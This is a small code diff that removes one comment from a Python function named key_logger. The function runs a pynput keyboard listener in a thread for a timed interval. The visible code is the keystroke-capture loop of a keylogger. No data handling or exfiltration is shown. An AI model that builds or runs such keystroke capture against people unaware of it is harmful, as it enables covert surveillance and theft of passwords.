@@ -25,7 +25,6 @@ def key_logger(timeRec):
     with Listener(on_press=on_press) as listener:
         listener_thread = threading.Thread(target=listener.join)
         listener_thread.start()
-        # listen for ten seconds
         time.sleep(timeLog)
         listener.stop()
 
